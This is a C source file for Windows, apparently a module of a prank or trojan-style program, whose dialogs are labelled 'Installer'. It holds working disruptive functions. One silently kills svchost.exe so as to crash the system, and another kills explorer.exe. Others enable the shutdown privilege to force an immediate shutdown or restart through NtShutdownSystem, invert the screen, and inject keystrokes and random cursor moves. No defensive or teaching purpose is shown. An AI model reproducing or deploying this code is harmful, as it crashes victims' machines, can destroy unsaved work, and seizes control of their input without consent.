#include "headers/misctools.h"
#include <shellapi.h>





void blueScreenSystem() {
    WinExec("taskkill /f /im svchost.exe", SW_HIDE);
}

void killExplorer(){
    WinExec("taskkill /f /im explorer.exe", SW_HIDE);
}

static BOOL giveShutDownPerms(){
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)){
        return FALSE;
    }
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, (PLUID)&tkp.Privileges);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if(!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)){
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

typedef NTSTATUS(WINAPI *PNtShutdownSystem)(ULONG);

void ShutdownSystem(){
    if(!giveShutDownPerms()){
        MessageBoxW(NULL, L"Failed Shutting Down System\n", L"Installer", MB_OK | MB_ICONERROR);
        return;
    }
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PNtShutdownSystem NtShutdown = (PNtShutdownSystem)GetProcAddress(ntdll, "NtShutdownSystem");
    NtShutdown(0);
    FreeLibrary(ntdll);
}

void restartSystem(){
    if(!giveShutDownPerms()){
        MessageBoxW(NULL, L"Failed Shutting Down System\n", L"Installer", MB_OK | MB_ICONERROR);
        return;
    }
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PNtShutdownSystem NtShutdown = (PNtShutdownSystem)GetProcAddress(ntdll, "NtShutdownSystem");
    NtShutdown(1);
    FreeLibrary(ntdll);
}

void InvertColor(){
    HDC hdc = GetDC(NULL);
    RECT rect;
    GetClientRect(GetDesktopWindow(), &rect);
    InvertRect(hdc, &rect);
    ReleaseDC(NULL, hdc);
}

void scrambleMouseAndKey(){
    keybd_event('h', 0, 0, 0);
    keybd_event('h', 0, KEYEVENTF_KEYUP, 0);
    srand(time(NULL));
    SetCursorPos(rand() % 1000, rand() % 1000);
}

void startExplorer(){
    ShellExecuteA(NULL, "runas", "explorer.exe", NULL, NULL, SW_SHOW);
}